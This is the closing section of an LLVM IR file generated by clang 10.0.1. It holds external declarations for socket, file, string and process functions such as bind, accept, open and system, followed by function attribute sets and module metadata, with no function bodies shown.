declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @listen(i32, i32) #1

declare dso_local i32* @strstr(i8*, i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
